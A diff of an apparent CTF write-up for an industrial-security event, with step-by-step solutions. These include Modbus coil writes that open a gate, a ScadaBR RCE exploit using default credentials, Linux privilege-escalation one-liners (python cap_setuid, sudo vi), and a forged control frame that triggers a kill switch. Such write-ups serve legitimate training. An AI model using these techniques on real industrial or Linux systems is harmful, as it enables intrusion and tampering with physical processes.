@@ -30,15 +30,17 @@ This event focuses on:
 
 Each task reinforces critical skills for **red teamers, blue teamers, and ICS security professionals** looking to expand their knowledge in industrial cybersecurity.
 
-## Task 3 – Breach
+---
 
-Category: N/A  
+## Task 3 – Breach (TryHackMe OT Gate Bypass)
+
+Category: Boot2Root  
 Difficulty: Beginner  
 Flag: THM{s4v3_th3_d4t3_27_jun3}
 
 ### Steps Taken
 
-1. **Scanned all ports to identify services:**
+1. **Scanned all ports:**
 
 ```
 nmap -p- -Pn -n --open -T5 <target_ip>
@@ -46,35 +48,33 @@ nmap -p- -Pn -n --open -T5 <target_ip>
 
 Found **502/tcp Modbus TCP** open.
 
-2. **Analyzed challenge notes and Node-RED flows (provided):**
+2. **Analyzed Node-RED flows:**
 
-- **Coil 20**: motion detector
-- **Coil 25**: badge authentication
+- Coil 20 = motion detector
+- Coil 25 = badge authentication
 
-3. **Tested setting coils 20 and 25 to true using mbtget:**
+3. **Set coils 20 & 25 to true:**
 
 ```
-mbtget -w5 1 -u 1 -a 20 <target_ip>  # Enable motion detection
-mbtget -w5 1 -u 1 -a 25 <target_ip>  # Enable badge authentication
+mbtget -w5 1 -u 1 -a 20 <target_ip>
+mbtget -w5 1 -u 1 -a 25 <target_ip>
 ```
 
-4. **Confirmed coil states with:**
+4. **Confirmed with:**
 
 ```
 mbtget -r1 -u 1 -a 0 -n 40 <target_ip>
 ```
 
-Showed coils 20 and 25 were set to 1.
+Both coils showed 1.
 
-5. **Gate remained closed, hypothesized an additional trigger coil.**
-
-6. **Tested coil 30 as gate trigger:**
+5. **Tested coil 30 as gate trigger:**
 
 ```
 mbtget -w5 1 -u 1 -a 30 <target_ip>
 ```
 
-7. **Gate opened, revealing flag.**
+6. **Gate opened.**
 
 ---
 
@@ -86,7 +86,7 @@ Flag: THM{D15C0RD_57A5H_C0MM4ND5}
 
 ### Steps Taken
 
-1. Joined the provided Discord server invite.
+1. Joined Discord server.
 
 2. Ran:
 
@@ -94,7 +94,7 @@ Flag: THM{D15C0RD_57A5H_C0MM4ND5}
 /secret-function
 ```
 
-Bot responded with the flag.
+Bot returned the flag.
 
 ---
 
@@ -106,15 +106,15 @@ Flag: THM{Su5sss}
 
 ### Steps Taken
 
-1. **Queried crt.sh for certificates issued to** `virelia-water.it.com`.
+1. Queried crt.sh for certificates of `virelia-water.it.com`.
 
-2. **Found subdomain:**
+2. Found subdomain:
 
 ```
 54484d7b5375357373737d.virelia-water.it.com
 ```
 
-3. **Decoded hex to ASCII:**
+3. Converted hex to ASCII:
 
 ```
 THM{Su5sss}
@@ -130,13 +130,13 @@ Flag: THM{uplink_channel_confirmed}
 
 ### Steps Taken
 
-1. **Viewed phishing page source, found JS config reference:**
+1. Inspected phishing page source, found JS:
 
 ```
 <script src="https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js">
 ```
 
-2. **Fetched JS revealing:**
+2. Fetched JS revealing:
 
 ```js
 var beacon = {
@@ -146,19 +146,15 @@ var beacon = {
 };
 ```
 
-3. **Searched VirusTotal for fallback subdomain:**
+3. Queried VirusTotal for `uplink-fallback.virelia-water.it.com`.
 
-```
-uplink-fallback.virelia-water.it.com
-```
-
-4. **Found DNS TXT record containing base64:**
+4. Found TXT record with base64:
 
 ```
 eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=
 ```
 
-5. **Decoded multiple times to JSON:**
+5. Decoded to:
 
 ```json
 {
@@ -177,21 +173,15 @@ Flag: THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}
 
 ### Steps Taken
 
-1. Challenge referenced removed report:
+1. Challenge mentioned removed report URL.
 
-```
-https://virelia-water.it.com/mail-archives/ot-alerts/2025-06.html
-```
+2. Manually searched GitHub for `virelia-water`.
 
-2. **Manually searched GitHub for** `virelia-water`.
+3. Found repo: `virelia-water/compliance`.
 
-3. **Found repo:** `virelia-water/compliance`
+4. Located commit embedding PGP alert.
 
-4. **Located commit:**
-
-*"Embed PGP-signed OT alert for June 2025"*
-
-5. **Extracted PGP-signed message:**
+5. Extracted PGP message:
 
 ```
 -----BEGIN PGP SIGNED MESSAGE-----
@@ -212,13 +202,7 @@ Sh5H
 -----END PGP SIGNATURE-----
 ```
 
-6. **Verified signature with:**
-
-```
-gpg --verify file.asc
-```
-
-7. **Issuer UID contained flag.**
+6. Verified with GPG, UID included flag.
 
 ---
 
@@ -230,36 +214,27 @@ Flag: THM{rce_archieved_through_script_injection}
 
 ### Steps Taken
 
-1. **Discovered open ports:**
+1. Scanned and found ports 22,80,5901,8080 open.
 
-- 22
-- 80
-- 5901
-- 8080
+2. Port 8080 hosted ScadaBR.
 
-2. **Navigated to port 8080:** Found ScadaBR login.
+3. Logged in with `admin:admin`.
 
-3. **Logged in with default credentials:**
-
-```
-admin:admin
-```
-
-4. **Ran searchsploit:**
+4. Ran:
 
 ```
 searchsploit ScadaBR
 ```
 
-Found exploit **49734.py** for Windows RCE.
+Found exploit 49734.py for Windows RCE.
 
-5. **Executed exploit:**
+5. Executed:
 
 ```
 python2 49734.py <target_ip> 8080 admin admin
 ```
 
-6. **Obtained shell and retrieved flag.**
+6. Obtained shell, retrieved flag.
 
 ---
 
@@ -271,19 +246,19 @@ Flag: THM{Ev1l_M@Cr0}
 
 ### Steps Taken
 
-1. Found `writing_template.eml` containing a base64 attachment.
+1. Found `writing_template.eml` with base64 macro doc.
 
-2. **Decoded to** `malware.docm`.
+2. Decoded to `malware.docm`.
 
-3. **Analyzed macro with olevba:**
+3. Ran:
 
 ```
 olevba malware.docm
 ```
 
-4. Macro decoded shellcode array XOR’d with `"l33t"`, allocated memory, and executed with `CreateThread`.
+4. Macro decoded byte array XOR with `"l33t"` and executed shellcode.
 
-5. **Decoded embedded password from net user command:**
+5. Decoded base64 password:
 
 ```
 echo 'VEhNe0V2MWxfTUBDcjB9' | base64 -d
@@ -307,61 +282,37 @@ Root: THM{check_check_check_mate}
 
 ### Steps Taken
 
-1. **Scanned open ports:**
+1. Found open ports: 22,79,80.
 
-```
-nmap -p- -Pn -n --open -T5 <target_ip>
-```
+2. Visited http site – PrecisionChess IoT, no login form.
 
-Found:
-
-- 22/tcp SSH
-- 79/tcp finger
-- 80/tcp http
-
-2. **Visited web interface** (PrecisionChess IoT) – no login.
-
-3. **Enumerated finger service:**
+3. Ran:
 
 ```
 finger @<target_ip>
 ```
 
-Found users:
+Listed: magnus, fabiano, hikaru.
 
-- magnus
-- fabiano
-- hikaru
-
-4. **Queried fabiano specifically:**
+4. Queried fabiano:
 
 ```
 finger fabiano@<target_ip>
 ```
 
-Found `.plan` with base64 string.
+Found .plan with base64 string.
 
-5. **Decoded:**
-
-```
-echo '<base64>' | base64 -d
-```
-
-Revealed:
+5. Decoded to reveal:
 
 ```
 fabiano:o3jVTktarGQI07q
 ```
 
-6. **SSH as fabiano:**
+6. SSH with these credentials.
 
-```
-ssh fabiano@<target_ip>
-```
+7. Retrieved user flag from home directory.
 
-Retrieved user flag in home directory.
-
-7. **Checked capabilities for privilege escalation:**
+8. Checked capabilities:
 
 ```
 getcap -r / 2>/dev/null | grep python
@@ -373,13 +324,269 @@ Found:
 /usr/bin/python3.10 = cap_setuid+ep
 ```
 
-8. **Exploited with:**
+9. Priv esc with:
 
 ```
 python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-9. **Retrieved root flag from /root directory.**
+10. Retrieved root flag.
+
+---
+
+## Task 16 – Boot2Root Under Construction
+
+Category: Boot2Root  
+Difficulty: Easy  
+Flags:  
+User: THM{nic3_j0b_You_got_it_w00tw00t}  
+Root: THM{y0u_g0t_it_welldoneeeee}
+
+### Steps Taken
+
+1. Dirbusted and found `/keys/`.
+
+2. Listed files – only `key9` had content.
+
+3. Saved and chmod 600.
+
+4. SSH as dev:
+
+```
+ssh -i key9 dev@<target_ip>
+```
+
+5. `sudo -l` showed vi allowed.
+
+6. Priv esc:
+
+```
+sudo vi
+:!bash
+```
+
+Retrieved user and root flags.
+
+---
+
+## Task 20 – Crypto Echoed Streams
+
+Category: Crypto  
+Difficulty: Easy  
+Flag: THM{Echo_Telemetry}
+
+### Steps Taken
+
+1. Downloaded cipher1.bin (known plaintext) and cipher2.bin.
+
+2. Both used same AES-GCM nonce.
+
+3. Wrote Python script to XOR c1 ^ c2 ^ p1 to recover p2:
+
+```python
+from Crypto.Util.strxor import strxor
+
+with open('cipher1.bin','rb') as f1, open('cipher2.bin','rb') as f2:
+    c1 = f1.read()[16:-16]
+    c2 = f2.read()[16:-16]
+
+p1 = b"BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;"
+p2 = strxor(strxor(c1,p1),c2)
+print(p2.decode())
+```
+
+Output: THM{Echo_Telemetry}
+
+---
+
+# Task 21 – Crypto – CRC Me If You Can
+
+Goal: Forge a valid control frame with correct CRC to disable covert implant.
+
+## Steps
+
+1. Downloaded challenge files:
+   - `gateway_proto.py` (contains `crc32` function)
+   - `open_frame.bin` (example frame)
+   - `kill_switch.bin` (kill command payload)
+
+2. Reviewed open_frame.bin to understand structure:
+
+```bash
+xxd open_frame.bin
+```
+
+Output:
+
+```
+00000000: cafe 0104 4f50 454e 92e5 6e10
+```
+
+- Header: `cafe`
+- Opcode: `0104`
+- Payload: `4f50454e` (“OPEN”)
+- CRC: `92e56e10`
+
+3. Tested CRC-Oracle (port 1501) with arbitrary payloads to confirm framing.
+
+4. Confirmed kill_switch.bin direct submission failed:
+
+```bash
+cat kill_switch.bin | nc <target_ip> 1500
+```
+
+Returned:
+
+```
+FAIL
+```
+
+5. Wrote forge script using provided crc32 function:
+
+```python
+from gateway_proto import crc32
+
+with open('kill_switch.bin', 'rb') as f:
+    payload = f.read()
+
+crc = crc32(payload)
+
+frame = b'\xca\xfe\x05' + bytes([len(payload)]) + payload + crc.to_bytes(4, 'little')
+
+with open('kill_frame.bin', 'wb') as f:
+    f.write(frame)
+
+print(f"[+] Frame generated with CRC: {hex(crc)}")
+```
+
+6. Submitted forged frame:
+
+```bash
+nc <target_ip> 1500 < kill_frame.bin
+```
+
+Output:
+
+```
+THM{crc_m4c_c0mprom1s3d_2093982}
+```
+
+---
+
+# Task 22 – Networking – Rogue Poller
+
+Goal: Determine what data an attacker retrieved via Modbus TCP register scans.
+
+## Steps
+
+1. Downloaded PCAP file: `rogue-poller-1750969333044.pcapng`
+
+2. Opened in Wireshark.
+
+3. Applied filter:
+
+```
+tcp.port == 502
+```
+
+4. Followed TCP stream to inspect Modbus read requests.
+
+5. Identified attacker reading holding registers.
+
+6. Viewed raw decoded output to find flag embedded as ASCII string:
+
+```
+THM{1nDu5tr14L_r3g1st3rs}
+```
+
+Flag recovered from observed Modbus register data.
+
+---
+
+# Task 23 – Networking – Register Sweep
+
+Goal: Locate ASCII-encoded information in device’s Modbus holding registers.
+
+## Steps
+
+1. Target: `<target_ip>`
+
+2. Confirmed Modbus TCP port 502 open.
+
+3. Ran enumeration in chunks of 125 (max allowed by mbtget):
+
+```bash
+mbtget -r3 -a 0 -n 125 -hex <target_ip>
+mbtget -r3 -a 125 -n 75 -hex <target_ip>
+```
+
+4. Combined all hex register values.
+
+5. Wrote quick decode script:
+
+```python
+regs = [
+  "d6b8", "e941", ... # all 200 register hexes here
+]
+
+output = b""
+for reg in regs:
+    swapped = reg[2:4] + reg[0:2]
+    output += bytes.fromhex(swapped)
+
+print(output.decode("ascii", errors="ignore"))
+```
+
+Output revealed flag string embedded in registers:
+
+```
+THM{m4nu4l_p0ll1ng_r3g1st3rs}
+```
+
+---
+
+# Task 24 – Reversing – Auth
+
+Goal: Determine correct 8-character unlock code for embedded auth binary.
+
+## Steps
+
+1. Downloaded stripped binary `auth`.
+
+2. Opened in Ghidra and reversed main logic.
+
+3. Key discovery: Binary expected an 8-byte input, each byte XOR’d with `0x55` and compared against:
+
+```
+0xefcdab8967452301
+```
+
+4. Wrote quick solve script:
+
+```python
+target = 0xefcdab8967452301
+code = b""
+
+for i in range(8):
+    byte = (target >> (i*8)) & 0xff
+    code += bytes([byte ^ 0x55])
+
+print(code[::-1]) # reversed for input order
+```
+
+5. Ran script to obtain correct unlock input.
+
+6. Submitted to the remote service:
+
+```bash
+echo -ne '\x54\x76\x10\x32\xdc\xfe\x98\xba' | nc <target_ip> 9005
+```
+
+Output:
+
+```
+[?] Enter unlock code: [+] Access Granted! Flag: THM{Simple_tostart_nice_done_mwww}
+```
 
 ---
 
